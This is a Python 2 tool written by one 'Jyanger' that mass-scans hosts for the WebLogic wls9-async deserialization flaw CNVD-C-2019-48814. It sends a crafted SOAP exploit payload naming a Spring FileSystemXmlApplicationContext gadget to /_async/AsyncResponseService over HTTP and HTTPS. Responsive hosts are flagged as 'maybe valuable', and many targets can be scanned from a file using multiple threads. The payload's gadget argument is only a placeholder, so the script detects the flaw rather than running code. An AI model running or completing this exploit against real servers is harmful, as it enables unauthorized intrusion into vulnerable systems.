#coding:utf-8
#author:Jyanger       [socket -->post data should + content-lenrth]

import socket
import sys
import time
import ssl
import threading,Queue

lock = threading.Lock()
threads = []
socket.setdefaulttimeout(0.5)         #设置socket超时


class MyThread(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self.queue = queue
    def run(self):
        while True:  # 除非确认队列中已经无任务，否则时刻保持线程在运行
            try:
                url = self.queue.get(block=False)    # 如果队列空了，直接结束线程。
                check(url,int(sys.argv[2]))
            except Exception,e:
                break

def check(url,port):
    payload ="""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
            <soapenv:Header>
            <wsa:Action>xx</wsa:Action>
            <wsa:RelatesTo>xx</wsa:RelatesTo>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
            <class>
            <string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
            <void>
            <string>xx</string>
            </void>
            </class>
            </java>
            </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body>
            <asy:onAsyncDelivery/>
            </soapenv:Body>
            </soapenv:Envelope>"""
    payload = payload.encode('utf-8')
    body_bytes = payload.encode('ascii')
    content_length=len(body_bytes)
    try:
        #基于http
        client1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client1.connect((url,port))
        client1.sendall('''POST /_async/AsyncResponseService HTTP/1.1\r\nHost: {}:{}\r\nContent-Type: text/xml\r\nSOAPAction: xx\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Length: {}\r\n\r\n{}'''.format(url,port,content_length,payload))
        Response1 = client1.recv(1024)
        if "HTTP/1.1 202 Accepted" in Response1:
            lock.acquire()
            print "[+]"+url+":"+str(port)
            lock.release()
        else :
            pass
        client1.close()
    except socket.error as e:
        pass

    try:
         #基于https
        client2 = ssl.wrap_socket(socket.socket())
        client2.connect((url,port))
        client2.sendall('''POST /_async/AsyncResponseService HTTP/1.1\r\nHost: {}:{}\r\nContent-Type: text/xml\r\nSOAPAction: xx\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Length: {}\r\n\r\n{}'''.format(url,port,content_length,payload))
        Response2 = client2.recv(1024)
        if "HTTP/1.1 202 Accepted" in Response2:
            lock.acquire()
            print "[+]"+url+":"+str(port)
            lock.release()
        else :
            pass
        client2.close()
    except socket.error as e:
        pass
        
if __name__=="__main__":
    number = 0
    print u'|+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++|'
    time.sleep(0.3)
    print u'|------Effect    WebLogic  10.X, 12.1.3, (CNVD-C-2019-48814)------|'
    time.sleep(0.3)
    print u'|----     weblogic-wls9-async-CNVD-C-2019-48814 tool!         ----|'
    time.sleep(0.3)
    print u'|----                    Author:Jyanger                       ----|'
    time.sleep(0.3)
    print u'|+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++|'
    time.sleep(0.3)
    print u'[+]+++++++++++++++++++++maybe valueable ip++++++++++++++++++++++++|'
    if len(sys.argv)!=4 and len(sys.argv)!=3:
        print u"useage: python2 weblogic-wls9-async-check.py 192.168.1.1 7001"
        print u"useage: python2 weblogic-wls9-async-check.py url.txt/url.ini 7001 10"
    else:
        if ".txt" in sys.argv[1] or ".ini" in sys.argv[1]:
            thread_count = int(sys.argv[3])     #此处修改线程数
            queue = Queue.Queue()
            file = open(sys.argv[1], 'r')
            for url in file.readlines():
                url = url.replace('\n', '')
                queue.put(url)
                number = number + 1
            file.close()
            for i in range(thread_count):
                threads.append(MyThread(queue))
            print u"[+]-------------------------total url "+ str(number) +u"---------------------------"
            for t in threads:
                try:
                    t.start()
                except Exception as e:
                    print e
                    continue
            for t in threads:
                try:
                    t.join()
                except Exception as e:
                    print e
                    continue
        else :
            check(str(sys.argv[1]),int(sys.argv[2]))
    print u"|-------------------CNVD-C-2019-48814 check end-------------------|"
    
